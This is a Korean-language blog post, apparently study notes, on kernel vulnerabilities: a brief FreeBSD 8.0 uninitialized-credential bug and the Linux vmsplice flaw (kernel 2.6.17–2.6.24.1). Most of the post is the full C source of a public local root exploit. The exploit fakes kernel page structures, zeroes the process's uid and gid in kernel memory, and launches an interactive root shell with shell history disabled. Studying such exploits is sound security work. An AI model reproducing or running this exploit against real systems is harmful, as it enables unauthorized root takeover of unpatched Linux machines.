---
layout: post
title: "AGTKE: Attacking the Core"
date: 2015-07-13 10:07:33 +0900
comments: true
categories: 
---

#### FreeBSD 8.0 'Assigning values to uninitialized pointer'

```
struct ucred ucred, *ucp;
...
refcount_init(&ucred.cr_ref, 1);
ucred.cr_uid = ip->i_uid;
ucred.cr_ngroups = 1;
ucred.cr_groups[0] = dp->i_gid; 
ucp = &ucred;
```

```
struct ucred {
    u_int cr_ref;
    ...
    gid_t *cr_groups;
    int cr_agroups;
};
```

ucred 는 스택에 alloc 되는데, 적절히 init 안하고, ucred.cr_groups[0] 에 writing 을 한다. 전에 불렸던 펑션콜의 스택 사용에 따라서 ucred.cr_groups 의 값이 바뀌게 된다. 

#### Linux vmsplice_to_user()

* Linux kernel 2.6.17 - 2.6.24.1
* [CVE-2008-0009](http://www.gossamer-threads.com/lists/linux/kernel/876580)
* [Patched src](http://www.cs.fsu.edu/~baker/devices/lxr/http/source/linux/fs/splice.c?v=2.6.25)
* [vmsplice exploit-db](http://www.exploit-db.com/exploits/5092/)
* [ColeSec](http://colesec.inventedtheinternet.com/tag/cve-2008-0009/)
* [semtex reddit thread](http://www.reddit.com/r/netsec/comments/1eb9iw/sdfucksheeporgs_semtexc_local_linux_root_exploit/)

base 는 user space 에서 온 값인데, `sd.u.userptr` 로 갔다가 __copy_to_user_inatomic() 이라는 write 함수로 흘러버린다. kernel 주소를 kernel 에 넘겨서, kernel memory write 를 하는 취약점.

``` 
    error = get_user(base, &iov->iov_base); // get_user 는 매크로라 &base 할 필요가 없다.
    ...
    if (unlikely(!base)) {
        error = -EFAULT;
        break;
    }
    ...
    sd.u.userptr = base;
    ...
    size = __splice_from_pipe(pipe, &sd, pipe_to_user);
...
static int pipe_to_user(struct pipe_inode_info *pipe, struct pipe_buffer *buf,
    struct splice_desc *sd)
{
    if (!fault_in_pages_writeable(sd->u.userptr, sd->len)) {
        src = buf->ops->map(pipe, buf, 1);
        ret = __copy_to_user_inatomic(sd->u.userptr, src+buf->offset, sd->len);
        buf->ops->unmap(pipe, buf, src);
...
}
```

exploit.c

```
#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <limits.h>
#include <signal.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <asm/page.h>
#define __KERNEL__
#include <asm/unistd.h>
 
#define PIPE_BUFFERS    16
#define PG_compound 14
#define uint        unsigned int
#define static_inline   static inline __attribute__((always_inline))
#define STACK(x)    (x + sizeof(x) - 40)
 
struct page {
    unsigned long flags;
    int count;
    int mapcount;
    unsigned long private;
    void *mapping;
    unsigned long index;
    struct { long next, prev; } lru;
};
 
void    exit_code();
char    exit_stack[1024 * 1024];
 
void    die(char *msg, int err)
{
    printf(err ? "[-] %s: %s\n" : "[-] %s\n", msg, strerror(err));
    fflush(stdout);
    fflush(stderr);
    exit(1);
}
 
#if defined (__i386__)
 
#ifndef __NR_vmsplice
#define __NR_vmsplice   316
#endif
 
#define USER_CS     0x73
#define USER_SS     0x7b
#define USER_FL     0x246
 
static_inline
void    exit_kernel()
{
    __asm__ __volatile__ (
    "movl %0, 0x10(%%esp) ;"
    "movl %1, 0x0c(%%esp) ;"
    "movl %2, 0x08(%%esp) ;"
    "movl %3, 0x04(%%esp) ;"
    "movl %4, 0x00(%%esp) ;"
    "iret"
    : : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
        "i" (USER_CS), "r" (exit_code)
    );
}
 
static_inline
void *  get_current()
{
    unsigned long curr;
    __asm__ __volatile__ (
    "movl %%esp, %%eax ;"
    "andl %1, %%eax ;"
    "movl (%%eax), %0"
    : "=r" (curr)
    : "i" (~8191)
    );
    return (void *) curr;
}
 
#elif defined (__x86_64__)
 
#ifndef __NR_vmsplice
#define __NR_vmsplice   278
#endif
 
#define USER_CS     0x23
#define USER_SS     0x2b
#define USER_FL     0x246
 
static_inline
void    exit_kernel()
{
    __asm__ __volatile__ (
    "swapgs ;"
    "movq %0, 0x20(%%rsp) ;"
    "movq %1, 0x18(%%rsp) ;"
    "movq %2, 0x10(%%rsp) ;"
    "movq %3, 0x08(%%rsp) ;"
    "movq %4, 0x00(%%rsp) ;"
    "iretq"
    : : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
        "i" (USER_CS), "r" (exit_code)
    );
}
 
static_inline
void *  get_current()
{
    unsigned long curr;
    __asm__ __volatile__ (
    "movq %%gs:(0), %0"
    : "=r" (curr)
    );
    return (void *) curr;
}
 
#else
#error "unsupported arch"
#endif
 
#if defined (_syscall4)
#define __NR__vmsplice  __NR_vmsplice
_syscall4(
    long, _vmsplice,
    int, fd,
    struct iovec *, iov,
    unsigned long, nr_segs,
    unsigned int, flags)
 
#else
#define _vmsplice(fd,io,nr,fl)  syscall(__NR_vmsplice, (fd), (io), (nr), (fl))
#endif
 
static uint uid, gid;
 
void    kernel_code()
{
    int i;
    uint    *p = get_current();
 
    for (i = 0; i < 1024-13; i++) {
        if (p[0] == uid && p[1] == uid &&
            p[2] == uid && p[3] == uid &&
            p[4] == gid && p[5] == gid &&
            p[6] == gid && p[7] == gid) {
            p[0] = p[1] = p[2] = p[3] = 0;
            p[4] = p[5] = p[6] = p[7] = 0;
            p = (uint *) ((char *)(p + 8) + sizeof(void *));
            p[0] = p[1] = p[2] = ~0;
            break;
        }
        p++;
    }   
 
    exit_kernel();
}
 
void    exit_code()
{
    if (getuid() != 0)
        die("wtf", 0);
 
    printf("[+] root\n");
    putenv("HISTFILE=/dev/null");
    execl("/bin/bash", "bash", "-i", NULL);
    die("/bin/bash", errno);
}
 
int main(int argc, char *argv[])
{
    int     pi[2];
    size_t      map_size;
    char *      map_addr;
    struct iovec    iov;
    struct page *   pages[5];
 
    uid = getuid();
    gid = getgid();
    setresuid(uid, uid, uid);
    setresgid(gid, gid, gid);
 
    printf("-----------------------------------\n");
    printf(" Linux vmsplice Local Root Exploit\n");
    printf(" By qaaz\n");
    printf("-----------------------------------\n");
 
    if (!uid || !gid)
        die("!@#$", 0);
 
    /*****/
    pages[0] = *(void **) &(int[2]){0,PAGE_SIZE};
    pages[1] = pages[0] + 1;
 
    map_size = PAGE_SIZE;
    map_addr = mmap(pages[0], map_size, PROT_READ | PROT_WRITE,
                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (map_addr == MAP_FAILED)
        die("mmap", errno);
 
    memset(map_addr, 0, map_size);
    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
    printf("[+] page: 0x%lx\n", pages[0]);
    printf("[+] page: 0x%lx\n", pages[1]);
 
    pages[0]->flags    = 1 << PG_compound;
    pages[0]->private  = (unsigned long) pages[0];
    pages[0]->count    = 1;
    pages[1]->lru.next = (long) kernel_code;
 
    /*****/
    pages[2] = *(void **) pages[0];
    pages[3] = pages[2] + 1;
 
    map_size = PAGE_SIZE;
    map_addr = mmap(pages[2], map_size, PROT_READ | PROT_WRITE,
                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (map_addr == MAP_FAILED)
        die("mmap", errno);
 
    memset(map_addr, 0, map_size);
    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
    printf("[+] page: 0x%lx\n", pages[2]);
    printf("[+] page: 0x%lx\n", pages[3]);
 
    pages[2]->flags    = 1 << PG_compound;
    pages[2]->private  = (unsigned long) pages[2];
    pages[2]->count    = 1;
    pages[3]->lru.next = (long) kernel_code;
 
    /*****/
    pages[4] = *(void **) &(int[2]){PAGE_SIZE,0};
    map_size = PAGE_SIZE;
    map_addr = mmap(pages[4], map_size, PROT_READ | PROT_WRITE,
                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (map_addr == MAP_FAILED)
        die("mmap", errno);
    memset(map_addr, 0, map_size);
    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
    printf("[+] page: 0x%lx\n", pages[4]);
 
    /*****/
    map_size = (PIPE_BUFFERS * 3 + 2) * PAGE_SIZE;
    map_addr = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (map_addr == MAP_FAILED)
        die("mmap", errno);
 
    memset(map_addr, 0, map_size);
    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
 
    /*****/
    map_size -= 2 * PAGE_SIZE;
    if (munmap(map_addr + map_size, PAGE_SIZE) < 0)
        die("munmap", errno);
 
    /*****/
    if (pipe(pi) < 0) die("pipe", errno);
    close(pi[0]);
 
    iov.iov_base = map_addr;
    iov.iov_len  = ULONG_MAX;
 
    signal(SIGPIPE, exit_code);
    _vmsplice(pi[1], &iov, 1, 0);
    die("vmsplice", errno);
    return 0;
}
```
